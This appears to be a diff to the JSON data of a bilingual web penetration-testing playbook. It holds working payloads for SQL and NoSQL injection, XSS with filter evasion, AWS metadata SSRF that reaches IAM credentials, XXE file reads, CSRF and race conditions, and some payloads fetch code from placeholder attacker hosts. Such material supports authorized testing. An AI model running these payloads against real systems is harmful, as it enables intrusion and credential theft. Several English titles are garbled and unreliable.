-          "expectedCommand": "def queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=30,\n                           requestsPerConnection=100,\n                           pipeline=True)\n    for i in range(50):\n        engine.queue(target.req, gate=\"race1\")\n    engine.openGate(\"race1\")\n\ndef handleResponse(req, interesting):\n    if \"success\" in req.response:\n        table.add(req)",
-          "description": {
-            "zh": "以 Turbo Intruder gate 同步释放 50 个请求；多个请求同时命中 success 或资源被多次扣减，即确认并发原子性缺失。",
-            "en": "Release 50 requests simultaneously via the Turbo Intruder gate; multiple successes or repeated resource deduction confirms missing concurrency atomicity."
-          },
-          "title": {
-            "zh": "Burp Turbo Intruder测试",
-            "en": "Burp Turbo Intruder Test"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "import asyncio\nimport aiohttp\n\nasync def race_request(session, url, headers, data):\n    async with session.post(url, headers=headers, json=data) as resp:\n        return await resp.json()\n\nasync def main():\n    url = \"https://{TARGET}/api/coupon/claim\"\n    headers = {\"Authorization\": \"Bearer {TOKEN}\"}\n    data = {\"coupon_id\": \"COUPON001\"}\n    async with aiohttp.ClientSession() as session:\n        tasks = [race_request(session, url, headers, data) for _ in range(50)]\n        results = await asyncio.gather(*tasks)\n        success = sum(1 for r in results if r.get(\"code\") == 200)\n        print(f\"Total: {len(results)}, Success: {success}\")\n\nasyncio.run(main())",
-          "title": {
-            "zh": "Python并发测试脚本",
-            "en": "Pythonconcurrent Test Script"
-          }
-        }
-      ]
-    },
-    {
-      "id": "biz-password-reset",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "# 原始失败响应\n{\"code\": 400, \"message\": \"验证码错误\"}\n\n# 拦截并修改为成功\n{\"code\": 200, \"message\": \"验证成功\", \"token\": \"reset_token_here\"}\n\n# 某些前端仅检查code字段就放行后续操作",
-          "title": {
-            "zh": "响应操纵绕过",
-            "en": "Response manipulation bypass"
-          }
-        }
-      ]
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--",
+     "title": {
+      "zh": "ORDER BY 列数探测与 UNION NULL 对齐",
+      "en": "Column-count probing via ORDER BY and UNION NULL alignment"
+     }
     }
-  ]
+   ]
+  },
+  {
+   "id": "sqli-mssql-basic",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "' OR 1=1--\n' OR '1'='1\n1' AND 1=1--\n1' AND 1=2--",
+     "description": {
+      "zh": "提交恒真/恒假布尔条件探测注入点；真/假两次请求响应出现稳定差异即确认注入可控。",
+      "en": "Probe the injection point with always-true/always-false boolean conditions; a stable difference between the two responses confirms controllable injection."
+     },
+     "title": {
+      "zh": "探测注入点",
+      "en": "Detect injection point"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "' UNION SELECT 1,@@version,3--\n' UNION SELECT 1,SERVERPROPERTY('Edition'),3--\n' UNION SELECT 1,SERVERPROPERTY('ProductVersion'),3--",
+     "description": {
+      "zh": "注入 @@version 与 SERVERPROPERTY 读取版本信息；回显出版本号与 Edition 即确认版本信息可读。",
+      "en": "Inject @@version and SERVERPROPERTY to read version details; version string and Edition in the output confirm readable version metadata."
+     },
+     "title": {
+      "zh": "获取版本信息",
+      "en": "Enumerate version information"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "' UNION SELECT 1,user_name(),3--\n' UNION SELECT 1,suser_name(),3--\n' UNION SELECT 1,system_user,3--\n' UNION SELECT 1,is_srvrolemember('sysadmin'),3--",
+     "description": {
+      "zh": "读取当前登录名并检测 sysadmin 角色；回显登录名且 is_srvrolemember('sysadmin') 为 1 即确认高权限上下文。",
+      "en": "Read the current login and test the sysadmin role; the login reflected with is_srvrolemember('sysadmin') = 1 confirms a high-privilege context."
+     },
+     "title": {
+      "zh": "获取用户信息",
+      "en": "Enumerate user information"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "' UNION SELECT 1,db_name(),3--\n' UNION SELECT 1,db_name(0),3--\n' UNION SELECT 1,db_name(1),3--\n' UNION SELECT name,2,3 FROM master..sysdatabases--",
+     "description": {
+      "zh": "以 db_name(n) 与 sysdatabases 枚举数据库；返回库名清单即确认库枚举可用。",
+      "en": "Enumerate databases via db_name(n) and sysdatabases; the returned database list confirms database enumeration."
+     },
+     "title": {
+      "zh": "获取数据库信息",
+      "en": "Enumerate database information"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 4,
+     "expectedCommand": "' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--\n' UNION SELECT 1,name,3 FROM sys.tables--\n' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
+     "description": {
+      "zh": "从 sysobjects/sys.tables/information_schema 枚举用户表；返回用户表名清单即确认表枚举可用。",
+      "en": "Enumerate user tables from sysobjects/sys.tables/information_schema; the returned table list confirms table enumeration."
+     },
+     "title": {
+      "zh": "获取表名",
+      "en": "Enumerate table names"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 5,
+     "expectedCommand": "' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--\n' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--",
+     "description": {
+      "zh": "把 users 替换为目标表名后枚举列名；返回该表列名清单即确认列枚举可用。",
+      "en": "Replace users with the target table and enumerate columns; the returned column list confirms column enumeration."
+     },
+     "title": {
+      "zh": "获取列名",
+      "en": "Enumerate column names"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 6,
+     "expectedCommand": "' UNION SELECT 1,username+':'+password,3 FROM users--\n' UNION SELECT TOP 1 username,password,3 FROM users--",
+     "description": {
+      "zh": "以 + 拼接 username 与 password 提取数据；回显出现 username:password 形式的凭据即确认数据可提取。",
+      "en": "Extract data by concatenating username and password with +; username:password pairs in the response confirm data extraction."
+     },
+     "title": {
+      "zh": "提取数据",
+      "en": "Extract Data"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "' UNION SELECT 1,master.dbo.fn_varbintohexstr(CAST(username AS VARBINARY)),3 FROM users--",
+     "description": {
+      "zh": "以 Hex 编码读取 username 提交；回显为十六进制串且可解码还原即确认编码读取可用、关键字检测被绕过。",
+      "en": "Read username as hex encoding; a decodable hex string in the response confirms encoded reads work and keyword detection is bypassed."
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "'/**/UNION/**/SELECT/**/1,2,3--\n' UN%00ION SELECT 1,2,3--",
+     "description": {
+      "zh": "以注释分词与空字节变体提交 UNION；语句仍执行并返回相同结果即确认注释/空字节绕过有效。",
+      "en": "Resubmit UNION with comment tokenization and null-byte variants; the statement still executes with identical results, confirming the comment/null-byte bypass."
+     }
+    }
+   ]
+  },
+  {
+   "id": "sqli-mongodb-basic",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "{\"username\": \"admin\", \"password\": \"password\"}\n{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}\n{\"username\": \"admin\", \"password\": {\"$gt\": \"\"}}",
+     "description": {
+      "zh": "提交明文凭据与 $ne/$gt 操作符变体探测注入；操作符版本返回登录成功或查询结果改变即确认查询结构可被操作符改写。",
+      "en": "Submit plaintext credentials alongside $ne/$gt operator variants; a successful login or changed query result from the operator versions confirms operator-rewritable query structure."
+     },
+     "title": {
+      "zh": "探测注入点",
+      "en": "Detect injection point"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "{\"username\": \"admin\", \"password\": {\"$ne\": \"wrongpass\"}}\n{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}",
+     "description": {
+      "zh": "提交 $ne/$gt 恒真条件绕过密码比对；返回认证通过即确认登录逻辑可被 NoSQL 操作符绕过。",
+      "en": "Submit always-true $ne/$gt conditions to bypass password comparison; an authenticated result confirms the login logic is bypassable with NoSQL operators."
+     },
+     "title": {
+      "zh": "绕过认证",
+      "en": "Bypass authentication"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "{\"username\": \"admin\", \"$or\": [{\"password\": \"realpass\"}, {\"password\": {\"$ne\": \"\"}}]}",
+     "description": {
+      "zh": "用 $or 组合恒真条件注入；返回结果集扩大或认证通过即确认逻辑运算可注入。",
+      "en": "Inject always-true $or combinations; an enlarged result set or successful authentication confirms logical-operator injection."
+     },
+     "title": {
+      "zh": "逻辑运算注入",
+      "en": "Logical operator injection"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "{\"username\": {\"$regex\": \"^admin\"}, \"password\": {\"$ne\": \"\"}}",
+     "description": {
+      "zh": "以 $regex 前缀正则探测用户名；前缀命中与未命中时响应不同即确认正则注入可逐字符枚举。",
+      "en": "Probe usernames with $regex prefix patterns; differing responses between matching and non-matching prefixes confirm regex injection enables character-by-character enumeration."
+     },
+     "title": {
+      "zh": "正则注入",
+      "en": "Regex injection"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 4,
+     "expectedCommand": "{\"$where\": \"this.username == 'admin' && this.password.match(/.*/)\"}",
+     "description": {
+      "zh": "注入 $where JavaScript 条件；查询按脚本逻辑返回结果即确认服务端 JS 执行可注入。",
+      "en": "Inject $where JavaScript conditions; results following the script logic confirm injectable server-side JS execution."
+     },
+     "title": {
+      "zh": "$where注入",
+      "en": "$where injection"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 5,
+     "expectedCommand": "{\"username\": {\"$regex\": \"^a\"}}\n{\"username\": {\"$regex\": \"^ad\"}}\n{\"username\": {\"$regex\": \"^adm\"}}",
+     "title": {
+      "zh": "用户名前缀逐字符枚举（$regex）",
+      "en": "Character-by-character username prefix enumeration ($regex)"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "{\"username\": {\"\\u0024ne\": \"\"}}",
+     "description": {
+      "zh": "把 $ne 的美元符号写成 JSON Unicode 转义 \\u0024 提交；JSON 解码后操作符语义不变，仅匹配字面 $ 字符的过滤或检测即被绕过，操作符版本登录成功或查询结果改变即成功。",
+      "en": "Writes the dollar sign of $ne as the \\u0024 escape to test pipelines that parse operators only after Unicode decoding."
+     }
+    }
+   ]
+  },
+  {
+   "id": "xss-reflected",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\" onfocus=alert(1) autofocus \"",
+     "description": {
+      "zh": "提交基础脚本与事件载荷探测输出边界；alert 弹出或载荷原样出现在响应中即确认反射点可控。",
+      "en": "Submit basic script and event payloads to probe the output boundary; an alert firing or the payload reflected verbatim confirms a controllable reflection point."
+     },
+     "title": {
+      "zh": "探测XSS注入点",
+      "en": "Validation step 1 for Reflected XSS Output Boundary"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "<img src=x onerror=alert(1)>\n<body onload=alert(1)>\n<input onfocus=alert(1) autofocus>\n<marquee onstart=alert(1)>\n<video><source onerror=alert(1)>\n<audio src=x onerror=alert(1)>",
+     "description": {
+      "zh": "逐行测试不同标签上的事件处理器；任一行触发 alert 即确认对应事件形式未被过滤。",
+      "en": "Test event handlers across different tags line by line; any line firing an alert confirms that event form is unfiltered."
+     },
+     "title": {
+      "zh": "事件处理器绕过",
+      "en": "Validation step 2 for Reflected XSS Output Boundary"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "<ScRiPt>alert(1)</ScRiPt>\n<IMG SRC=x OnErRoR=alert(1)>\n<svg/onload=alert(1)>\n<details/open/ontoggle=alert(1)>",
+     "description": {
+      "zh": "以大小写混淆与标签变形提交；仍触发执行即确认过滤按大小写敏感的字面形态匹配，未覆盖大小写变体与标签变形。",
+      "en": "Submit case-obfuscated and tag-mutated payloads; execution still firing confirms the filter is insensitive to case and tag form."
+     },
+     "title": {
+      "zh": "标签绕过",
+      "en": "Validation step 3 for Reflected XSS Output Boundary"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",
+     "description": {
+      "zh": "以 HTML 实体编码 alert 提交；解码后仍执行即确认实体编码可绕过关键字过滤。",
+      "en": "Submit entity-encoded alert payloads; execution after decoding confirms HTML-entity encoding bypasses keyword filtering."
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "<script>\\u0061lert(1)</script>\n<img src=x onerror=\\u0061lert(1)>",
+     "description": {
+      "zh": "以 \\u0061 转义书写 alert 提交；JS 解码后仍执行即确认 Unicode 转义可绕过关键字过滤。",
+      "en": "Write alert with \\u0061 escapes; execution after JS decoding confirms Unicode escapes bypass keyword filtering."
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 2,
+     "expectedCommand": "<scr<script>ipt>alert(1)</scr</script>ipt>\n<imimgg src=x onerror=alert(1)>",
+     "description": {
+      "zh": "双写标签提交；过滤器删除内层后拼回有效标签并执行即确认关键字删除过滤可绕过。",
+      "en": "Submit double-written tags; the filter deleting the inner tag and the remainder reassembling into a working tag confirms keyword-deletion filtering is bypassable."
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 3,
+     "expectedCommand": "<script>/**/alert(1)/**/</script> \n <img src=x onerror=/*x*/alert(1)> \n <svg onload=/*x*/alert(1)>",
+     "description": {
+      "zh": "以注释插入拆分关键字与属性提交；仍触发执行即确认注释混淆可绕过检测。",
+      "en": "Split keywords and attributes with inserted comments; execution still firing confirms comment obfuscation evades detection."
+     },
+     "command": "<script>/**/alert(1)/**/</script> \n <img src=x onerror=/*x*/alert(1)> \n <svg onload=/*x*/alert(1)>"
+    }
+   ]
+  },
+  {
+   "id": "xss-stored",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "<img src=x onerror=alert(1) style=\"display:none\"> \n <svg/onload=alert(1) style=\"position:absolute;left:-9999px\"> \n <style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=alert(1)>",
+     "description": {
+      "zh": "以隐藏样式的事件载荷注入存储点；查看页静默触发执行即确认隐蔽形态可绕过目视检查。",
+      "en": "Inject event payloads with hidden styling into the storage point; silent execution on the viewing page confirms stealthy forms evade visual inspection."
+     },
+     "title": {
+      "zh": "隐蔽Payload",
+      "en": "Stealthy Payload"
+     },
+     "command": "<img src=x onerror=alert(1) style=\"display:none\"> \n <svg/onload=alert(1) style=\"position:absolute;left:-9999px\"> \n <style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=alert(1)>"
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "<svg><script>alert(1)</script></svg>\n<svg><animate onbegin=alert(1)>\n<svg><set onbegin=alert(1)>",
+     "description": {
+      "zh": "以 SVG script/animate/set 标签提交；仍触发执行即确认 SVG 标签绕过有效。",
+      "en": "Submit SVG script/animate/set tags; execution still firing confirms the SVG-tag bypass."
+     }
+    },
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "<script>alert(1)</script>\n\"><script>alert(1)</script>",
+     "title": {
+      "zh": "存储点直注与闭合标签",
+      "en": "Direct stored-point injection and tag closure"
+     }
+    }
+   ]
+  },
+  {
+   "id": "xss-dom",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "document.write(location.hash)\ninnerHTML = location.search\neval(location.hash)\nsetTimeout(location.hash, 0)\njQuery(html)\n$(location.hash)",
+     "description": {
+      "zh": "对照常见 DOM Sink（document.write、innerHTML、eval、setTimeout、jQuery html）观察源数据写入后的行为；任一 Sink 触发执行即确认对应数据流可达。",
+      "en": "Watch behavior after source data is written to common DOM sinks (document.write, innerHTML, eval, setTimeout, jQuery html); any sink firing confirms that data flow is reachable."
+     },
+     "title": {
+      "zh": "常见Sink点",
+      "en": "common Sinkpoint"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "javascript:alert(1)\njavascript\t:alert(1)\njaVaScRiPt:alert(1)\n&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)\n<a href=\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)\">click</a>",
+     "description": {
+      "zh": "以大小写混淆、HTML 实体编码、制表符插入等变体绕过 javascript: 协议过滤；过滤后仍可导航执行即确认协议过滤可绕过。",
+      "en": "Bypass javascript: scheme filtering with case obfuscation, HTML-entity encoding, and tab insertion; navigation/execution surviving the filter confirms the scheme filter is bypassable."
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "<svg onload=alert(1)>\n<svg/onload=alert(1)>\n<math><mtext><table><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src=1>\">\n<details open ontoggle=alert(1)>\n<body onpageshow=alert(1)>\n<input onfocus=alert(1) autofocus>",
+     "description": {
+      "zh": "利用 SVG、MathML 等非标准标签与 ontoggle/onpageshow 等冷门事件绕过黑名单；载荷仍触发执行即确认标签与事件黑名单覆盖不全。",
+      "en": "Evade blacklists with SVG/MathML tags and rare events like ontoggle/onpageshow; payloads still firing confirm the tag and event blacklists have gaps."
+     }
+    },
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "#<script>alert(1)</script>\n?param=<img src=x onerror=alert(1)>",
+     "title": {
+      "zh": "Hash 与查询参数源注入",
+      "en": "Hash and query-string source injection"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "window.addEventListener(\"message\", function(e){\ndocument.getElementById(\"output\").innerHTML = e.data;\n});\ntargetWindow.postMessage(\"<img src=x onerror=alert(1)>\", \"*\");",
+     "title": {
+      "zh": "postMessage 源注入",
+      "en": "postMessage source injection"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 6,
+     "expectedCommand": "javascript:alert(1) \n javascript:alert(document.cookie) \n javascript:prompt(1) \n javascript:confirm(1) \n javascript:void(alert(1)) \n data:text/html,<script>alert(1)</script> \n data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== \n data:text/html,<img src=x onerror=alert(1)> \n data:text/html,<svg onload=alert(1)>",
+     "command": "javascript:alert(1) \n javascript:alert(document.cookie) \n javascript:prompt(1) \n javascript:confirm(1) \n javascript:void(alert(1)) \n data:text/html,<script>alert(1)</script> \n data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== \n data:text/html,<img src=x onerror=alert(1)> \n data:text/html,<svg onload=alert(1)>"
+    }
+   ]
+  },
+  {
+   "id": "xss-csp-bypass",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "<script>alert(1)</script>",
+     "description": {
+      "zh": "在允许 unsafe-inline 的 CSP 下直接内联执行脚本；alert 弹出即确认宽松策略可被直接利用。",
+      "en": "Run an inline script under a CSP allowing unsafe-inline; the alert firing confirms permissive policy is directly exploitable."
+     },
+     "title": {
+      "zh": "unsafe-inline 直注验证",
+      "en": "unsafe-inline direct injection check"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "<script src=\"https://allowed-domain.com/jsonp?callback=alert(1)\"></script>",
+     "description": {
+      "zh": "借助白名单域上的 JSONP 端点把回调名设为 alert(1)；响应作为脚本执行并弹出即确认 JSONP 信任边界可滥用。allowed-domain.com 替换为目标 CSP 实际允许的域。",
+      "en": "Use a JSONP endpoint on an allowlisted domain with the callback set to alert(1); the response executing as a script confirms JSONP trust-boundary abuse. Replace allowed-domain.com with a domain actually allowed by the target CSP."
+     },
+     "title": {
+      "zh": "白名单域 JSONP 回调执行",
+      "en": "JSONP callback execution on an allowlisted domain"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com",
+     "title": {
+      "zh": "样例 CSP 响应头基线",
+      "en": "Sample CSP response header baseline"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "<script>eval(\"alert(1)\")</script>\n<script>setTimeout(\"alert(1)\", 0)</script>",
+     "title": {
+      "zh": "unsafe-eval 求值验证",
+      "en": "unsafe-eval evaluation check"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 4,
+     "expectedCommand": "<div ng-app ng-csp>\n<div ng-focus=\"$event.path|orderBy:'[].constructor.from([alert(1)])'\" tabindex=0>\n</div>\n</div>",
+     "title": {
+      "zh": "Angular ng-csp 表达式执行",
+      "en": "Angular ng-csp expression execution"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 3,
+     "expectedCommand": "<script>import('//{ATTACKER_HOST}/evil.js')</script>",
+     "description": {
+      "zh": "绕过对 <script src= 字面特征的匹配：import() 不出现 src= 字样即发起模块加载（仍受目标 CSP script-src 约束，需该源在白名单内）。判据：evil.js 模块被加载并执行。",
+      "en": "Module import avoids static script-src signatures. Success: module executes."
+     }
+    }
+   ]
+  },
+  {
+   "id": "ssrf-cloud-aws",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/user-data/\nhttp://169.254.169.254/latest/dynamic/instance-identity/",
+     "description": {
+      "zh": "逐条经 SSRF 注入点访问 AWS IMDS 路径；返回元数据目录或字段（如 instance-id）即确认 IMDS 可达。",
+      "en": "Access AWS IMDS paths through the SSRF injection point; a returned metadata directory or fields (such as instance-id) confirm IMDS reachability."
+     },
+     "title": {
+      "zh": "访问元数据服务",
+      "en": "Access Element Data Service"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "http://169.254.169.254/latest/user-data/",
+     "description": {
+      "zh": "读取 user-data 启动脚本；返回明文启动脚本即确认实例自定义数据可被读取，注意其中可能包含密钥。",
+      "en": "Read user-data startup scripts; plaintext returned confirms instance custom data is readable and may contain secrets."
+     },
+     "title": {
+      "zh": "读取 user-data 启动脚本",
+      "en": "AWS IMDSv2 SSRF Validation Cleaned Command 3"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "PUT http://169.254.169.254/latest/api/token\nHeader: X-aws-ec2-metadata-token-ttl-seconds: 21600\n\nGET http://169.254.169.254/latest/meta-data/\nHeader: X-aws-ec2-metadata-token: {IMDSV2_TOKEN}",
+     "description": {
+      "zh": "先 PUT 获取 IMDSv2 token，再携带 token 请求头读取元数据；第一步取得带 TTL 的 token 且第二步返回元数据，即确认 v2 流程可被 SSRF 复现。",
+      "en": "PUT to obtain an IMDSv2 token, then read metadata with the token header; obtaining a TTL-bearing token and then metadata confirms the v2 flow can be replayed through SSRF."
+     },
+     "command": "PUT http://169.254.169.254/latest/api/token\nHeader: X-aws-ec2-metadata-token-ttl-seconds: 21600\n\nGET http://169.254.169.254/latest/meta-data/\nHeader: X-aws-ec2-metadata-token: {IMDSV2_TOKEN}",
+     "title": {
+      "zh": "PUT 取 token 读元数据",
+      "en": "AWS IMDSv2 SSRF Validation Cleaned Command 4"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "http://2852039166/latest/meta-data/\nhttp://0xA9FEA9FE/latest/meta-data/\nhttp://0251.0376.0251.0376/latest/meta-data/\nhttp://[::ffff:169.254.169.254]/latest/meta-data/\nhttp://0xA9.0376.169.0xFE/latest/meta-data/",
+     "description": {
+      "zh": "逐条提交 IMDS 地址的整数、十六进制与 IPv6 映射变体；任一变体返回元数据而标准地址被拦截，即确认过滤只匹配字符串形式。",
+      "en": "Submit integer, hex, and IPv6-mapped IMDS address variants; any variant returning metadata while the literal form is blocked confirms string-only filtering."
+     },
+     "title": {
+      "zh": "IMDS 地址进制变形绕过",
+      "en": "AWS IMDSv2 SSRF Validation Cleaned Command 1"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "http://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}",
+     "title": {
+      "zh": "IMDS 枚举角色取凭证",
+      "en": "AWS IMDSv2 SSRF Validation Cleaned Command 2"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "http://7f000001.A9FEA9FE.rbndr.us/latest/meta-data/\nhttp://{ATTACKER_HOST}/redirect?url=http://169.254.169.254/latest/meta-data/\ngopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.254.169.254%0A%0A",
+     "title": {
+      "zh": "重定向与重绑定链式绕过",
+      "en": "AWS IMDSv2 SSRF Validation Cleaned Command 2"
+     }
+    }
+   ]
+  },
+  {
+   "id": "xxe-basic",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n]>\n<root>&xxe;</root>",
+     "description": {
+      "zh": "以实体读取 Windows win.ini；回显文件内容即确认 Windows 平台文件可读。",
+      "en": "Read Windows win.ini via an entity; the file content in the response confirms readable Windows files."
+     },
+     "title": {
+      "zh": "读取文件",
+      "en": "Read File"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">\n]>\n<root>&xxe;</root>",
+     "description": {
+      "zh": "以 php://filter Base64 读取 index.php；回显 Base64 串且解码得到源码即确认 PHP wrapper 可用。",
+      "en": "Read index.php via php://filter Base64; a Base64 string that decodes to source code confirms the PHP wrapper works."
+     },
+     "title": {
+      "zh": "读取PHP源码",
+      "en": "Read PHP Source Code"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n]>\n<root>&xxe;</root>",
+     "description": {
+      "zh": "以实体请求云元数据地址；回显元数据 JSON 即确认解析器可发起出站请求（XXE→SSRF）。仅在授权实验中用隔离模拟端点替代真实元数据地址。",
+      "en": "Request the cloud metadata address through an entity; metadata JSON in the response confirms parser-initiated outbound requests (XXE→SSRF). Replace the real metadata address with an isolated simulator in authorized labs only."
+     },
+     "title": {
+      "zh": "SSRF攻击",
+      "en": "SSRF attack"
+     }
+    },
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://{LAB_OAST}/evil.dtd\">%xxe;]><root>test</root>",
+     "command": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://{LAB_OAST}/evil.dtd\">%xxe;]><root>test</root>"
+    },
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file://{FILE_PATH}\">]><root>&xxe;</root>",
+     "command": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file://{FILE_PATH}\">]><root>&xxe;</root>"
+    }
+   ]
+  },
+  {
+   "id": "csrf-basic",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "<!doctype html>\n<meta charset=\"utf-8\">\n<form action=\"http://127.0.0.1:18080/lab/csrf/profile-email\" method=\"post\">\n  <input type=\"hidden\" name=\"email\" value=\"csrf-a1@lab.invalid\">\n  <input type=\"hidden\" name=\"marker\" value=\"CSRF_FORM_A1\">\n  <button type=\"submit\">Submit local CSRF marker</button>\n</form>\n<script>document.forms[0].requestSubmit();</script>",
+     "description": {
+      "zh": "构造自动提交的 CSRF 表单并指向目标状态变更端点；表单加载即自动提交，目标端点收到携带会话 Cookie 的 POST 且合成 email/marker 发生变化，即确认该请求形状可被跨站伪造。",
+      "en": "Build an auto-submitting CSRF form pointing at the target state-changing endpoint; if submission fires on load and the endpoint receives the POST with ambient cookies and the synthetic email/marker changes, cross-site forgery of this request shape is confirmed."
+     },
+     "title": {
+      "zh": "构造CSRF表单",
+      "en": "Construct CSR Ftable Single"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 1,
+     "expectedCommand": "<img src=\"http://127.0.0.1:18080/lab/csrf/state-change-get?marker=CSRF_GET_B2\" alt=\"CSRF_GET_B2\">",
+     "description": {
+      "zh": "用 img 标签触发 GET 状态变更请求；服务端日志显示该 GET 携带会话 Cookie 并改变合成状态，即确认 GET 型 CSRF。",
+      "en": "Trigger a state-changing GET via an img tag; if the server log shows the GET carried the session cookie and changed synthetic state, GET-based CSRF is confirmed."
+     },
+     "title": {
+      "zh": "GET请求CSRF",
+      "en": "GET Request CSRF"
+     }
+    },
+    {
+     "area": "execution",
+     "index": 2,
+     "expectedCommand": "<script>\nfetch(\"http://127.0.0.1:18080/lab/csrf/json-compatible\", {\n  method: \"POST\",\n  credentials: \"include\",\n  headers: {\"Content-Type\": \"text/plain\"},\n  body: JSON.stringify({marker: \"CSRF_TEXT_C3\"})\n}).then(response => document.body.dataset.status = String(response.status));\n</script>",
+     "description": {
